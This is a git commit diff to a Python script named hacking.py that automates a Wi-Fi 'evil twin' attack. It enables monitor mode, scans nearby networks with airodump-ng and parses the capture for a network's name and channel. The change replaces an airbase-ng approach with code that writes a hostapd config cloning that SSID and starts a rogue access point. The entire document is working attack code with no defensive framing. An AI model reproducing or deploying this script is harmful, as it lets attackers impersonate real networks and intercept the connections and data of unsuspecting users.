6fac56af19b10e83a23b0fcb6ee23e184705ebeb
root <root@localhost.localdomain>
2018-04-13 18:21:35 -0400

    switched to hostapd

--- hacking.py
+++ hacking.py
@@ -4,7 +4,6 @@ from threading import Timer
 from os import system
 import time
 
-
 subprocess.call(['airmon-ng', 'start', 'wlan0'])
 p = subprocess.Popen(["airodump-ng", "wlan0mon", "-w", "output", "--output-format", "csv"])
 time.sleep(10)
@@ -31,4 +30,14 @@ with open('output-01.csv', newline='') as f:
 #print(name)
 #print(macAddr)
 #print(channel)
-#subprocess.call(['airbase-ng', '-e', name[1:], '-a', macAddr, 'wlan0mon'])
+
+subprocess.call(['rm', 'hostapd.conf'])
+
+with open('hostapd.conf', 'w') as f:
+    f.write('interface=wlan0mon\n')
+    f.write('driver=nl80211\n')
+    f.write('ssid=' + name[1:] + '\n')
+    f.write('channel=' + channel)
+
+
+subprocess.call(['hostapd', 'hostapd.conf'])
